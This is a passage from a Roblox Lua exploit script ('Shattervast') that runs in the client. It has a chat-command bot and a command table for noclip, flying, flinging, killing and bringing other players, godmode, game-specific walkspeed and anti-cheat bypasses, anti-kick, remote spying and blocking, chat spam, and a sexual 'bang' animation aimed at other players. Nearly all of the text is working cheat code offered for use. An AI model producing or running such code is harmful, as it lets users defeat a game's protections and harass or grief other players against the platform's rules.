Shadow2.Position = UDim2.new(0, 5, 0, 5)
Shadow2.Size = UDim2.new(0, 525, 0, 337)
Shadow2.ZIndex = -1
ScrollingFrame.Parent = MainChatFrame
ScrollingFrame.BackgroundColor3 = Color3.new(0.266667, 0.266667, 0.266667)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0, 65)
ScrollingFrame.Size = UDim2.new(0, 525, 0, 271)
ScrollingFrame.CanvasPosition = Vector2.new(0, 403)
ScrollingFrame.ScrollBarThickness = 8
function CreateChatText(plr, chat)
	for i,v in pairs(ScrollingFrame:GetDescendants()) do
		v.Position = v.Position - UDim2.new(0, 0, 0, 20)
		if v.Position == UDim2.new(0, 5, 0, 10) then
			v:Destroy()
		end
	end
	local Example = Instance.new("TextLabel")
	Example.Name = "Example"
	Example.Parent = ScrollingFrame
	Example.BackgroundColor3 = Color3.new(1, 1, 1)
	Example.BackgroundTransparency = 1
	Example.Position = UDim2.new(0, 5, 0, 650)
	Example.Size = UDim2.new(0, 500, 0, 20)
	Example.Font = Enum.Font.SourceSans
	Example.Text = "["..plr.Name.."]: "..chat
	Example.TextColor3 = Color3.new(0.960784, 0.960784, 0.960784)
	Example.TextScaled = true
	Example.TextSize = 20
	Example.TextWrapped = true
	Example.TextXAlignment = Enum.TextXAlignment.Left
end
CloseChatGUI.MouseButton1Click:Connect(function()
	MainChatFrame:TweenPosition(UDim2.new(0, 550, 0, -550), "InOut", "Sine", 2)
	wait(2.01)
	MainChatFrame.Visible = false
end)
printingChat = false
PrintChat.MouseButton1Click:Connect(function()
	if printingChat == false then
		printingChat = true
		PrintChat.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
	elseif printingChat == true then
		printingChat = false
		PrintChat.BackgroundColor3 = Color3.new(0.870588, 0.25098, 0.25098)
	end
end)
local UserInputService = game:GetService("UserInputService")
local dragging
local dragInput
local dragStart
local startPos
local function updateChat(input)
	local delta = input.Position - dragStart
	local dragTime = 0.055
	local SmoothDrag = {}
	SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	local dragSmoothFunction = gsTween:Create(MainChatFrame, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
	dragSmoothFunction:Play()
end
Frame_222.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = MainChatFrame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)
Frame_222.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		updateChat(input)
	end
end)

function printChat(player, chat)
	print("["..player.Name.."]: "..chat)
end
complimentReady = true
for i,currentPlayersChatting in pairs(game:GetService("Players"):GetPlayers()) do
	currentPlayersChatting.Chatted:connect(function(chat)
		CreateChatText(currentPlayersChatting, chat)
		if printingChat then
			printChat(currentPlayersChatting, chat)
		end
		if copychatACTIVE then
			if currentPlayersChatting == copychatplayer then
				gsReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chat, "All")
			end
		end
		if modeFling == true then
			if string.lower(string.sub(chat, 1, 7)) == "!fling " then
				if gsWorkspace:PGSIsEnabled() == false then
					FEGodmode()
				end
				if string.lower(string.sub(chat, 8)) == "me" then
					run(commandPrefix.."unfling")
					LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
					run(commandPrefix.."fling "..currentPlayersChatting.Name.." 2000000")
				else
					for i,notAll in pairs(findSinglePlayer(string.lower(string.sub(chat, 8)))) do
						if notAll ~= LP then
							run(commandPrefix.."unfling")
							LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
							run(commandPrefix.."fling "..notAll.Name.." 2000000")
						end
					end
				end
			end
		end
		if modeCompliment == true then
			if string.lower(string.sub(chat, 1, 3)) == "!c " then
				if complimentReady then
					complimentReady = false
					if string.lower(string.sub(chat, 4)) == "me" then
						complimentplr(currentPlayersChatting)
					else
						for i,Others in pairs(findSinglePlayer(string.lower(string.sub(chat, 4)))) do
							if Others == LP then
								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Don't be silly, I can't compliment myself!", "All")
							else
								complimentplr(Others)
							end
						end
					end
					wait(1)
					complimentReady = true
				end
			end
		end
		if modeMove == true then
			if string.lower(string.sub(chat, 1, 9)) == "!bringbot" then
				run(commandPrefix.."unfollow")
				run(commandPrefix.."unwalk")
				run(commandPrefix.."goto "..currentPlayersChatting.Name)
			elseif string.lower(string.sub(chat, 1, 6)) == "!walk " then
				for i,getWalkPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 7)))) do
					if getWalkPlayer == LP then
						run(commandPrefix.."unfollow")
						run(commandPrefix.."walk "..currentPlayersChatting.Name)
					else
						run(commandPrefix.."unfollow")
						run(commandPrefix.."walk "..getWalkPlayer.Name)
					end
				end
			elseif string.lower(string.sub(chat, 1, 8)) == "!follow " then
				for i,getFollowPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 9)))) do
					if getFollowPlayer == LP then
						run(commandPrefix.."unwalk")
						run(commandPrefix.."follow "..currentPlayersChatting.Name)
					else
						run(commandPrefix.."unwalk")
						run(commandPrefix.."follow "..getFollowPlayer.Name)
					end
				end
			end
		end
		if modeInfo == true then
			if infoReady then
				infoReady = false
				if string.lower(string.sub(chat, 1, 5)) == "!age " then
					for i,v in pairs(findSinglePlayer(string.lower(string.sub(chat, 6)))) do
						if v == LP then
							run(commandPrefix.."age "..currentPlayersChatting.Name)
						else
							run(commandPrefix.."age "..v.Name)
						end
					end
				end
				if string.lower(string.sub(chat, 1, 4)) == "!id " then
					for i,a in pairs(findSinglePlayer(string.lower(string.sub(chat, 5)))) do
						if a == LP then
							run(commandPrefix.."id "..currentPlayersChatting.Name)
						else
							run(commandPrefix.."id "..a.Name)
						end
					end
				end
				wait(1)
				infoReady = true
			end
		end
	end)
end
game:GetService("Players").PlayerAdded:connect(function(plr)
	plr.Chatted:connect(function(chat)
		CreateChatText(plr, chat)
		if printingChat then
			printChat(plr, chat)
		end
		if modeFling == true then
			if string.lower(string.sub(chat, 1, 7)) == "!fling " then
				if gsWorkspace:PGSIsEnabled() == false then
					FEGodmode()
				end
				if string.lower(string.sub(chat, 8)) == "me" then
					run(commandPrefix.."unfling")
					LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
					run(commandPrefix.."fling "..plr.Name.." 2000000")
				else
					for i,notAll in pairs(findSinglePlayer(string.lower(string.sub(chat, 8)))) do
						if notAll ~= LP then
							run(commandPrefix.."unfling")
							LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
							run(commandPrefix.."fling "..notAll.Name.." 2000000")
						end
					end
				end
			end
		end
		if modeCompliment == true then
			if string.lower(string.sub(chat, 1, 3)) == "!c " then
				if complimentReady == true then
					complimentReady = false
					if string.lower(string.sub(chat, 4)) == "me" then
						complimentplr(plr)
					else
						for i,Others in pairs(findSinglePlayer(string.lower(string.sub(chat, 4)))) do
							if Others == LP then
								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Don't be silly, I can't compliment myself!", "All")
							else
								complimentplr(Others)
							end
						end
					end
					wait(1)
					complimentReady = true
				end
			end
		end
		if modeMove == true then
			if string.lower(string.sub(chat, 1, 9)) == "!bringbot" then
				run(commandPrefix.."unfollow")
				run(commandPrefix.."unwalk")
				run(commandPrefix.."goto "..plr.Name)
			elseif string.lower(string.sub(chat, 1, 6)) == "!walk " then
				for i,getWalkPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 7)))) do
					if getWalkPlayer == LP then
						run(commandPrefix.."unfollow")
						run(commandPrefix.."walk "..plr.Name)
					else
						run(commandPrefix.."unfollow")
						run(commandPrefix.."walk "..getWalkPlayer.Name)
					end
				end
			elseif string.lower(string.sub(chat, 1, 8)) == "!follow " then
				for i,getFollowPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 9)))) do
					if getFollowPlayer == LP then
						run(commandPrefix.."unwalk")
						run(commandPrefix.."follow "..plr.Name)
					else
						run(commandPrefix.."unwalk")
						run(commandPrefix.."follow "..getFollowPlayer.Name)
					end
				end
			end
		end
		if modeInfo == true then
			if infoReady then
				infoReady = false
				if string.lower(string.sub(chat, 1, 5)) == "!age " then
					for i,v in pairs(findSinglePlayer(string.lower(string.sub(chat, 6)))) do
						if v == LP then
							run(commandPrefix.."age "..plr.Name)
						else
							run(commandPrefix.."age "..v.Name)
						end
					end
				end
				if string.lower(string.sub(chat, 1, 4)) == "!id " then
					for i,a in pairs(findSinglePlayer(string.lower(string.sub(chat, 5)))) do
						if a == LP then
							run(commandPrefix.."id "..plr.Name)
						else
							run(commandPrefix.."id "..a.Name)
						end
					end
				end
				wait(1)
				infoReady = true
			end
		end
	end)
end)

-- Loops
noclip = false
following = false
trailing = false
annoying = false
flingnoclip = false
staring = false
stopsitting = false
stareplr = ""
CBRINGamount = 3
spawnWS = CurrentWalkspeed
spawnJP = CurrentJumppower
spawnHH = CurrentHipheight
spawningfegod = false
looptpbypassfly = false
if game.GameId == 245662005 or game.GameId == 601130232 then
	bypassMODE = true
else
	bypassMODE = false
end
viewplr = ""
loopview = false
cmdForward = false
forwardSpeed = 1
loopviewfc = false
spinTOhead = false
spinObj = ""
rideACTIVE = false
ridePLAYER = ""

LPcurrenthumanoid = LP.Character.Humanoid
game:GetService('RunService').Stepped:connect(function()
	if LP.Character.Humanoid ~= nil then
		LPcurrenthumanoid = LP.Character.Humanoid
	end
	if noclip then
		if LP.Character then
			if LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
				LP.Character.Head.CanCollide = false
				LP.Character.Torso.CanCollide = false
				LP.Character["Left Leg"].CanCollide = false
				LP.Character["Right Leg"].CanCollide = false
				LP.Character["Left Arm"].CanCollide = false
				LP.Character["Right Arm"].CanCollide = false
			elseif LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
				LP.Character.Head.CanCollide = false
				LP.Character.UpperTorso.CanCollide = false
				LP.Character.LowerTorso.CanCollide = false
				LP.Character.HumanoidRootPart.CanCollide = false
			end
		end
	end
	if following then
		LP.Character.HumanoidRootPart.CFrame = gsPlayers[flwplr.Name].Character.HumanoidRootPart.CFrame + gsPlayers[flwplr.Name].Character.HumanoidRootPart.CFrame.lookVector * flwnum
	end
	if trailing then
		LP.Character.HumanoidRootPart.CFrame = gsPlayers[trlplr.Name].Character.HumanoidRootPart.CFrame + gsPlayers[trlplr.Name].Character.HumanoidRootPart.CFrame.lookVector * trlnum
	end
	if annoying then
		LP.Character.HumanoidRootPart.CFrame = gsPlayers[annplr.Name].Character.HumanoidRootPart.CFrame
	end
	if walkto then
		LP.Character.Humanoid:MoveTo(walkplr.Character.HumanoidRootPart.Position)
	end
	if cbringing then
		CBRINGplr.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * CBRINGamount
	end
	if cbringingall then
		for i,getbringplrs in pairs(gsPlayers:GetPlayers()) do
			if getbringplrs ~= LP then
				getbringplrs.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * CBRINGamount
			end
		end
	end
	if staring then
		LP.Character.HumanoidRootPart.CFrame = CFrame.new(LP.Character.Torso.Position, gsPlayers[stareplr.Name].Character.Torso.Position)
	end
	if stopsitting then
		LP.Character.Humanoid.Sit = false
	end
	if looptpbypassfly then
		pcall(function()
			LP.Character.Head.Anchored = false
			LP.Character.HumanoidRootPart.CFrame = gsWorkspace.rGETpartNUMBER2.CFrame
			LP.Character.Head.Anchored = true
		end)
	end
	if loopview then
		view(viewplr)
	end
	if cmdForward then
		LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * forwardSpeed
	end
	if loopviewfc then
		pcall(function()
			gsWorkspace.CurrentCamera.CameraSubject = gsWorkspace.rGETpartNUMBER2
		end)
	end
	if spinTOhead then
		pcall(function()
			spinObj.Position = LP.Character.Head.Position
		end)
	end
	if rideACTIVE == true then
		LP.character.HumanoidRootPart.CFrame = ridePLAYER.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
	end
end)
spawningatreset = false
spawnresetpoint = LP.Character.Head.CFrame

LPcurrenthumanoid.Died:Connect(function()
	flying = false
	doFREECAM = false
	if savingtoolsloop then
		run(commandPrefix.."savealltool")
	end
	if spawningatreset == true then
		spawnresetpoint = LP.Character.Head.CFrame + Vector3.new(0, 5, 0)
	end
end)

LP.CharacterAdded:Connect(function()
	wait(0.2)
	LP.Character.Humanoid.WalkSpeed = spawnWS
	LP.Character.Humanoid.JumpPower = spawnJP
	LP.Character.Humanoid.HipHeight = spawnHH
	if spawningfegod then
		FEGodmode()
	end
	if spawningpos and spawnpos ~= nil then
		LP.Character.HumanoidRootPart.CFrame = spawnpos
	end
	if spawningatreset == true then
		LP.Character.HumanoidRootPart.CFrame = spawnresetpoint
	end
end)

-- Commands
Commands = {}

Commands.print = function(args)
	local msg = table.concat(args," ")
	print(msg)
end

Commands.warn = function(args)
	local msg = table.concat(args," ")
	warn(msg)
end

Commands.sit = function(args)
	LP.Character.Humanoid.Sit = true
end

Commands.god = function(args)
	FEGodmode()
	Notification("warning", "You have enabled FE Godmode, tools will not work. Use "..commandPrefix.."grespawn to remove.", 7)
end

Commands.view = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			if bypassMODE == false then
				view(v)
				Notification("info", "Now viewing "..v.Name..". Use "..commandPrefix.."unview to stop viewing.", 3)
			elseif bypassMODE == true then
				viewplr = v
				loopview = true
			end
		end
	end
end

Commands.unview = function(args)
	view(LP)
	loopview = false
end

Commands.gravity = function(args)
	if args[1] then
		gsWorkspace.Gravity = args[1]
	end
end

Commands.ungravity = function(args)
	gsWorkspace.Gravity = CurrentGravity
end

Commands.goto = function(args)
	if args[1] then
		if bypassMODE == false then
			for i,v in pairs(findPlayer(args[1])) do
				LP.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
			end
		elseif bypassMODE == true then
			for i,v in pairs(findPlayer(args[1])) do
				local TPbypass = {}
				TPbypass.CFrame = v.Character.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0)
				local TPFunction = gsTween:Create(LP.Character.HumanoidRootPart, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), TPbypass)
				TPFunction:Play()
			end
		end
	end
end

Commands.fecheck = function(args)
	if gsWorkspace.FilteringEnabled == true then
		Notification("warning", "FE is enabled!", 7)
	else
		Notification("warning", "FE is disabled. Consider using a different script.", 7)
	end
end

Commands.lockws = function(args)
	lockWS()
	Notification("info", "Workspace locked.", 4)
end

Commands.unlockws = function(args)
	unlockWS()
	Notification("info", "Workspace unlocked.", 4)
end

Commands.noclip = function(args)
	noclip = true
	Notification("info", "Noclip enabled.", 4)
end

Commands.clip = function(args)
	noclip = false
	Notification("info", "Noclip disabled.", 4)
end

Commands.follow = function(args)
	if args[1] then
		for i,v in pairs(findPlayer(args[1])) do
			flwplr = v
		end
		if args[2] then
			flwnum = args[2]
		else
			flwnum = -5
		end
		following = true
	else
		Notification("warning", "No player selected to follow! Use: "..commandPrefix.."follow player", 4)
	end
end

Commands.unfollow = function(args)
	following = false
end

Commands.fling = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			if v ~= LP then
				view(v)
				pcall(function()
					LP.Character.HumanoidRootPart.Fling:Destroy()
				end)
				if not args[2] then
					RocketPropulsion(800000,1000,400000,v,"Fling")
				else
					RocketPropulsion(args[2],1500,400000,v,"Fling")
				end
				if noclip ~= true then
					flingnoclip = true
					noclip = true
				end
			end
		end
	else
		Notification("warning", "No player selected to fling! Use: "..commandPrefix.."fling player", 4)
	end
end

Commands.unfling = function(args)
	view(LP)
	pcall(function()
		if LP.Character.HumanoidRootPart.Fling then
			for i,v in pairs(LP.Character:GetDescendants()) do
				if v.Name == "Fling" and v:IsA("RocketPropulsion") then
					v:Destroy()
				end
			end
		end
	end)
	if flingnoclip == true then
		noclip = false
		flingnoclip = false
	end
end

Commands.trail = function(args)
	if args[1] then
		for i,v in pairs(findPlayer(args[1])) do
			trlplr = v
		end
		if args[2] then
			trlnum = args[2]
		else
			trlnum = 5
		end
		trailing = true
	else
		Notification("warning", "No player selected to trail! Use: "..commandPrefix.."trail player", 4)
	end
end

Commands.untrail = function(args)
	trailing = false
end

Commands.annoy = function(args)
	if args[1] then
		for i,v in pairs(findPlayer(args[1])) do
			annplr = v
		end
		annoying = true
	else
		Notification("warning", "No player selected to annoy! Use: "..commandPrefix.."annoy player", 4)
	end
end

Commands.unannoy = function(args)
	annoying = false
end

Commands.reset = function(args)
	LP.Character:BreakJoints()
end

Commands.grespawn = function(args)
	LP.Character.Humanoid.Health = 0
	wait(1)
	LP.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
	LP.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
end

Commands.respawn = function(args)
	local mod = Instance.new('Model', workspace) mod.Name = 'new '..LP.Name
	local hum = Instance.new('Humanoid', mod)
	local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
	LP.Character = mod
end

Commands.speed = function(args)
	if args[1] then
		run(commandPrefix.."ws "..args[1])
	end
end

bypassingwalkspeed = false
Commands.ws = function(args)
	if args[1] then
		if bypassMODE == false then
			LP.Character.Humanoid.WalkSpeed = args[1]
		elseif bypassMODE == true then
			if game.GameId == 245662005 then
				bypassingwalkspeed = true
				bypassWalkspeed = args[1]
			end
		end
	end
end

game:GetService("RunService").Heartbeat:Connect(function()
	if bypassingwalkspeed then
		LP.Character.Humanoid.WalkSpeed = bypassWalkspeed
	end
end)

Commands.jumppower = function(args)
	if args[1] then
		LP.Character.Humanoid.JumpPower = args[1]
	end
end

Commands.jp = function(args)
	if args[1] then
		LP.Character.Humanoid.JumpPower = args[1]
	end
end

Commands.hipheight = function(args)
	if args[1] then
		LP.Character.Humanoid.HipHeight = args[1]
	end
end

Commands.hh = function(args)
	if args[1] then
		LP.Character.Humanoid.HipHeight = args[1]
	end
end

Commands.default = function(args)
	LP.Character.Humanoid.WalkSpeed = CurrentWalkspeed
	LP.Character.Humanoid.HipHeight = CurrentHipheight
	LP.Character.Humanoid.JumpPower = CurrentJumppower
end

Commands.credits = function(args)
	Notification("info", "Shattervast was made by illremember#3799 , "..commandPrefix.."fullcredits for all credits.", 8)
end

Commands.attach = function(args)
	if hasTools() == false then
		Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
	else
		FEGodmode()
		for i,v in pairs(LP.Backpack:GetChildren())do
			LP.Character.Humanoid:EquipTool(v)
		end
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				if v ~= LP then
					LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
					wait(0.3)
					LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
				end
			end
		end
	end
end

Commands.fly = function(args)
	if bypassMODE == false then
		local speedget = 1
		repeat wait() until LP and LP.Character and LP.Character:FindFirstChild('HumanoidRootPart') and LP.Character:FindFirstChild('Humanoid')
		repeat wait() until Mouse
		if args[1] then
			speedfly = args[1]
		else
			speedfly = 1
		end
		
		local T = LP.Character.HumanoidRootPart
		local CONTROL = {F = 0, B = 0, L = 0, R = 0}
		local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
		local SPEED = speedget
		
		local function fly()
			flying = true
			local BG = Instance.new('BodyGyro', T)
			local BV = Instance.new('BodyVelocity', T)
			BG.P = 9e4
			BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			BG.cframe = T.CFrame
			BV.velocity = Vector3.new(0, 0.1, 0)
			BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
			spawn(function()
			repeat wait()
			LP.Character.Humanoid.PlatformStand = true
			if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
			SPEED = 50
			elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
			SPEED = 0
			end
			if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
			BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
			lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
			elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
			BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
			else
			BV.velocity = Vector3.new(0, 0.1, 0)
			end
			BG.cframe = workspace.CurrentCamera.CoordinateFrame
					until not flying
					CONTROL = {F = 0, B = 0, L = 0, R = 0}
					lCONTROL = {F = 0, B = 0, L = 0, R = 0}
					SPEED = 0
					BG:destroy()
					BV:destroy()
					LP.Character.Humanoid.PlatformStand = false
				end)
			end
		Mouse.KeyDown:connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = speedfly
			elseif KEY:lower() == 's' then
				CONTROL.B = -speedfly
			elseif KEY:lower() == 'a' then
				CONTROL.L = -speedfly 
			elseif KEY:lower() == 'd' then 
				CONTROL.R = speedfly
			end
		end)
		Mouse.KeyUp:connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = 0
			elseif KEY:lower() == 's' then
				CONTROL.B = 0
			elseif KEY:lower() == 'a' then
				CONTROL.L = 0
			elseif KEY:lower() == 'd' then
				CONTROL.R = 0
			end
		end)
		fly()
	elseif bypassMODE == true then
		if not args[1] then
			run(commandPrefix.."fc")
		else
			run(commandPrefix.."fc "..args[1])
		end
		LP.Character.Head.Anchored = false
		looptpbypassfly = true
		view(LP)
	end
end

Commands.unfly = function(args)
	if bypassMODE == false then
		flying = false
		LP.Character.Humanoid.PlatformStand = false
	else
		looptpbypassfly = false
		run(commandPrefix.."unfreecam")
		local goalTP = LP.Character.HumanoidRootPart.CFrame
		if game.GameId == 245662005 then
			for i = 1, 5 do wait(0.2)
				LP.Character.HumanoidRootPart.CFrame = goalTP
			end
		else
			LP.Character.HumanoidRootPart.CFrame = goalTP
		end
		LP.Character.Head.Anchored = false
	end
end

Commands.kill = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			if v == LP then
				LP.Character:BreakJoints()
			else
				if hasTools() == false then
					Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
				else
					FEGodmode()
					for i,v in pairs(LP.Backpack:GetChildren())do
						LP.Character.Humanoid:EquipTool(v)
					end
					local NOW = LP.Character.HumanoidRootPart.CFrame
					LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
					wait(0.3)
					LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
					local function tp(player,player2)
					local char1,char2=player.Character,player2.Character
					if char1 and char2 then
					char1:MoveTo(char2.Head.Position)
					end
					end
					wait(0.5)
					LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(100000,0,100000))
					wait(0.5)
					tp(LP,game:GetService("Players")[v.Name])
					wait(0.7)
					LP.Character.HumanoidRootPart.CFrame = NOW
					view(LP)
				end
			end
		end
	end
end
Commands.bring = function(args)
	if hasTools() == false then
		Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
	else
		FEGodmode()
		for i,v in pairs(LP.Backpack:GetChildren())do
			LP.Character.Humanoid:EquipTool(v)
		end
		if args[1] then
			for i,v in pairs(findSinglePlayer(args[1])) do
				if v ~= LP then
					local NOW = LP.Character.HumanoidRootPart.CFrame
					local function tp(player,player2)
					local char1,char2=player.Character,player2.Character
					if char1 and char2 then
					char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
					end
					end
					local function getout(player,player2)
					local char1,char2=player.Character,player2.Character
					if char1 and char2 then
					char1:MoveTo(char2.Head.Position)
					end
					end
					tp(game:GetService("Players")[v.Name], LP)
					wait(0.2)
					tp(game:GetService("Players")[v.Name], LP)
					wait(0.5)
					LP.Character.HumanoidRootPart.CFrame = NOW
					wait(0.5)
					getout(LP, game:GetService("Players")[v.Name])
					wait(0.3)
					LP.Character.HumanoidRootPart.CFrame = NOW
				end
			end
		end
	end
end

Commands.naked = function(args)
	for i,v in pairs(LP.Character:GetDescendants()) do
		if v:IsA("Clothing") then
			v:Destroy()
		end
	end
end

Commands.nolimbs = function(args)
	LP.Character["Left Arm"]:Destroy()
	LP.Character["Right Arm"]:Destroy()
	LP.Character["Left Leg"]:Destroy()
	LP.Character["Right Leg"]:Destroy()
end

Commands.noarms = function(args)
	LP.Character["Left Arm"]:Destroy()
	LP.Character["Right Arm"]:Destroy()
end

Commands.nolegs = function(args)
	LP.Character["Left Leg"]:Destroy()
	LP.Character["Right Leg"]:Destroy()
end

Commands.headless = function(args)
	local l = LP.Character.Humanoid:Clone()
	LP.Character.Humanoid:Destroy()
	wait(0.2)
	LP.Character.Head.CanCollide = false
	for i,v in pairs(LP.Character:GetDescendants()) do
		if string.sub(v.Name, 1, 4) == "Neck" then
			v:Destroy()
		end
	end
	wait(0.2)
	l.Name = "Humanoid"
	l.Parent = LP.Character
	wait(0.1)
	game:GetService("Workspace").CurrentCamera.CameraSubject = LP.Character
	LP.Character.Animate:Destroy()
end

antiremotes = false
Commands.antikick = function(args)
	if args[1] then
		if args[1] == "on" then
			antiremotes = true
			wait(0.2)
			for i,v in pairs(LP.Character:GetChildren()) do
				if string.find(string.lower(v.Name), "exploit") and v:IsA("LocalScript") then
					v.Disabled = true
				end
			end
			Notification("warning", "This command disables all remotes incase they are kick remotes, may break game.", 8)
			Notification("info", "Does not prevent serverside kicks, use "..commandPrefix.."antikick off to turn off.", 8)
		elseif args[1] == "off" then
			antiremotes = false
			Notification("warning", "Remote anti-kick turned off.", 8)
		end
	end
end

blockedremotes = {}
Commands.blockremote = function(args)
	local getService = ""
	if args[1] then
		local remoteName = string.lower(tostring(args[1]))
		if args[2] then
			local serviceRemote = string.lower(tostring(args[2]))
			if serviceRemote == "workspace" then
				getService = "Workspace"
			elseif serviceRemote == "replicatedstorage" then
				getService = "ReplicatedStorage"
			elseif serviceRemote == "players" then
				getService = "Players"
			elseif serviceRemote == "lighting" then
				getService = "Lighting"
			elseif serviceRemote == "startergui" then
				getService = "StarterGui"
			elseif serviceRemote == "starterpack" then
				getService = "StarterPack"
			elseif serviceRemote == "starterplayer" then
				getService = "StarterPlayer"
			else
				getService = "ReplicatedStorage"
			end
		else
			getService = "ReplicatedStorage"
		end
		for i,getRemote in pairs(game:GetService(getService):GetDescendants()) do
			if string.lower(getRemote.Name) == remoteName then
				table.insert(blockedremotes, getRemote.Name)
			end
		end
	end
	Notification("warning", "If this command does not work, make sure you type remote name/service fully correct.", 8)
end

spyingremotes = false
Commands.remotespy = function(args)
	if args[1] then
		if args[1] == "on" then
			spyingremotes = true
			Notification("info", "Remotespy turned on.", 4)
		elseif args[1] == "off" then
			spyingremotes = false
			Notification("info", "Remotespy turned off.", 4)
		end
	end
end

Commands.bang = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			if v ~= nil then
				following = true
				flwplr = v
				flwnum = -1
				local bangAnimation = Instance.new("Animation")
				bangAnimation.AnimationId = "rbxassetid://148840371"
				bangTrack = LP.Character.Humanoid:LoadAnimation(bangAnimation)
				if args[2] then
					bangTrack:Play(.1, 1, args[2])
				else
					bangTrack:Play(.1, 1, 1)
				end
			end
		end
	else
		Notification("warning", "No player selected to follow! Use: "..commandPrefix.."follow player", 4)
	end
end

Commands.unbang = function(args)
	following = false
	bangTrack:Stop()
end

spamdelay = 1
spamtext = "Spam"
spamming = false
Commands.spam = function(args)
	if args[1] then
		spamtext = args[1]
		spamming = true
	end
end
Commands.spamdelay = function(args)
	if args[1] then
		spamdelay = args[1]
	end
end
spawn(function()
	while wait(spamdelay) do
		if spamming then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamtext, "All")
		end
	end
end)

Commands.unspam = function(args)
	spamming = false
end

Commands.info = function(args)
	if args[1] then
		for i,v in pairs(findSinglePlayer(args[1])) do
			createINFO(v)
		end
	end
end

Commands.age = function(args)
	if args[1] then
		for i,v in pairs(findPlayer(args[1])) do
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." Account Age: "..v.AccountAge.." days!", "All")
		end
	end
end

Commands.invisible = function(args)
	local Character = LP.Character
	if LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
